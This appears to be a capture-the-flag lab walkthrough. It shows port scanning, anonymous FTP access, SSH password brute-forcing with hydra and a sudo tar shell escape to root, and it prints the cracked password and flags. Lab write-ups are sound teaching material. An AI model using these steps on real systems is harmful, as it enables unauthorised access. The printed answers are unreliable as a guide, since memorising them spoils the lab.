

# Find open ports on the machine

`nmap -sS -Pn -p- -T4 -vv $target`
`nmap -sU -Pn -p- -T4 -vv $target`


Open ports are SSH, FTP and HTTP.
# Who wrote the task list?

Navigate to the target in a web browser we see a web page with some background and some names.  The source contains no comments

`gobuster dir --url $target -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`

This only returned the `/images/` directory that contained the image we see on the main page.

Looking at the open ports, I attempted a connection to FTP using anonymous, the connection succeeded, but I was required to manually set passive mode off to allow data.

```
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

Getting the `task.txt` we can see that the file was authored by `lin`
```task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

We also look at `locks.txt`
```locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

Answer: `lin`

# What service can you bruteforce with the text file found?

Assuming `locks.txt` contains passwords for `lin`, lets try brute forcing the SSH connection.

`hydra -l lin -P locks.txt $target -t 4 ssh`
we get a successful response
```
[22][ssh] host: 10.10.85.128   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

Answer: `ssh`

# What is the users password?

Answer: `RedDr4gonSynd1cat3`

# user.txt

Answer: `THM{CR1M3_SyNd1C4T3}`

# root.txt

Running `sudo -l` we can execute `/bin/tar`
[GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo)
We run `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
```
tar: Removing leading `/' from member names
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
```